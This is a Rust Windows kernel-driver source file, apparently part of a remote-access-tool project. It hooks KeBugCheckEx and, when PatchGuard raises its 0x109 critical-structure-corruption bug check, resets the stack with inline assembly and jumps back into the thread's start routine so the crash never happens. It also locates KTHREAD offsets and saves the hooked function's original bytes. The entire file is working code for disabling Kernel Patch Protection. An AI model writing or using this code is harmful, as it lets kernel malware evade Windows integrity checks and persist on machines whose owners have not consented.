use alloc::boxed::Box;
use alloc::vec::Vec;
use core::arch::asm;
use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};
use core::{mem, ptr, slice};

use rat_common::windows::kernel::KernelHandoff;
use wdk_sys::ntddk::{
    IoGetInitialStack, KeBugCheckEx, MmGetSystemRoutineAddress, RtlInitUnicodeString,
};
use wdk_sys::{ULONG, ULONG_PTR, UNICODE_STRING};
use widestring::u16cstr;

use crate::wrappers::bindings::debug_break;
use crate::wrappers::mdl::MdlGuard;
use crate::{error, info, warn};

type _KeGetCurrentThreadFn = unsafe extern "C" fn() -> *mut u8;

const _KTHREAD_START_ROUTINE_SEARCH_RANGE: usize = 1000;
const _CRITICAL_STRUCTURE_CORRUPTION: ULONG = 0x109;

static _KE_GET_CURRENT_THREAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
static _KE_BUG_CHECK_EX_RECOVERY: AtomicPtr<Vec<u8>> = AtomicPtr::new(ptr::null_mut());
static _KTHREAD_START_ROUTINE_OFFSET: AtomicUsize = AtomicUsize::new(usize::MAX);

#[unsafe(no_mangle)]
unsafe extern "C" fn ke_bug_check_ex_hook(
    code: ULONG,
    parameter_1: ULONG_PTR,
    parameter_2: ULONG_PTR,
    parameter_3: ULONG_PTR,
    parameter_4: ULONG_PTR,
) -> ! {
    info!(
        "KeBugCheckEx called with 0x{code:X}, parameters: 0x{parameter_1:X}, 0x{parameter_2:X}, 0x{parameter_3:X}, 0x{parameter_4:X}",
    );
    if code == _CRITICAL_STRUCTURE_CORRUPTION {
        let ke_get_current_thread = _KE_GET_CURRENT_THREAD.load(Ordering::Acquire);
        if ke_get_current_thread.is_null() {
            error!("KeGetCurrentThread address is null");
            debug_break();
        }

        let start_routine_offset = _KTHREAD_START_ROUTINE_OFFSET.load(Ordering::Acquire);
        if start_routine_offset == usize::MAX {
            error!("KTHREAD StartRoutine offset is not found");
            debug_break();
        }

        let thread = unsafe {
            let ke_get_current_thread =
                mem::transmute::<*mut u8, _KeGetCurrentThreadFn>(ke_get_current_thread);
            ke_get_current_thread()
        };
        let start_routine = unsafe { thread.cast::<usize>().add(start_routine_offset) };
        let initial_sp = unsafe { IoGetInitialStack() as usize } & !0xF; // align to 16 bytes
        info!("Recover thread: start_routine = {start_routine:p}, initial_sp = 0x{initial_sp:X}");

        unsafe {
            asm! {
                "mov rsp, {initial_sp}",
                "mov ecx, 0", // set thread parameter to NULL
                "jmp {start_routine}",
                initial_sp = in(reg) initial_sp,
                start_routine = in(reg) start_routine,
                options(noreturn),
            };
        }
    }

    let recovery = _KE_BUG_CHECK_EX_RECOVERY.load(Ordering::Acquire);
    match unsafe { recovery.as_ref() } {
        Some(recovery) => {
            let ke_bug_check_ex = unsafe {
                let mut name = UNICODE_STRING::default();
                RtlInitUnicodeString(&mut name, u16cstr!("KeBugCheckEx").as_ptr());
                MmGetSystemRoutineAddress(&mut name)
            };

            if ke_bug_check_ex.is_null() {
                error!("Cannot get address of KeBugCheckEx for recovery");
                debug_break();
            }

            match unsafe { MdlGuard::new(ke_bug_check_ex, recovery.len() as u32) } {
                Ok(mut mdl) => {
                    mdl.as_mut_slice().copy_from_slice(recovery);

                    info!("Recovered KeBugCheckEx with {recovery:02X?}");
                    unsafe {
                        KeBugCheckEx(code, parameter_1, parameter_2, parameter_3, parameter_4);
                    }
                }
                Err(e) => {
                    error!("Failed to construct MDL to recover KeBugCheckEx: {e}");
                }
            }
        }
        None => {
            error!("No information to recover KeBugCheckEx");
        }
    }

    debug_break();
}

pub unsafe extern "C" fn disable_kpp_thread_routine(extra: *mut c_void) {
    let extra = unsafe { Box::from_raw(extra.cast::<KernelHandoff>()) };
    let ke_get_current_thread = unsafe {
        let mut name = UNICODE_STRING::default();
        RtlInitUnicodeString(&mut name, u16cstr!("KeGetCurrentThread").as_ptr());
        MmGetSystemRoutineAddress(&mut name)
    };

    if ke_get_current_thread.is_null() {
        error!("Cannot get address of KeGetCurrentThread");
        return;
    }

    _KE_GET_CURRENT_THREAD.store(ke_get_current_thread.cast(), Ordering::Release);

    let read = unsafe {
        let ke_get_current_thread =
            mem::transmute::<*mut c_void, _KeGetCurrentThreadFn>(ke_get_current_thread);
        ke_get_current_thread()
    }
    .cast::<usize>();

    let mut index = usize::MAX;
    let search = unsafe { slice::from_raw_parts_mut(read, _KTHREAD_START_ROUTINE_SEARCH_RANGE) };
    for (i, byte) in search.iter().enumerate() {
        if *byte == disable_kpp_thread_routine as *mut u8 as usize {
            info!("Found index of StartRoutine in KTHREAD at 0x{i:X} ({i})");
            index = i;
            break;
        }
    }

    if index == usize::MAX {
        warn!("Cannot find offset of StartRoutine in KTHREAD");
        return;
    }

    _KTHREAD_START_ROUTINE_OFFSET.store(index, Ordering::Release);

    let recovery = unsafe {
        slice::from_raw_parts(
            extra.ke_bug_check_ex.instructions,
            extra.ke_bug_check_ex.instructions_len,
        )
    };
    _KE_BUG_CHECK_EX_RECOVERY.store(
        Box::into_raw(Box::new(recovery.to_vec())),
        Ordering::Release,
    );
}
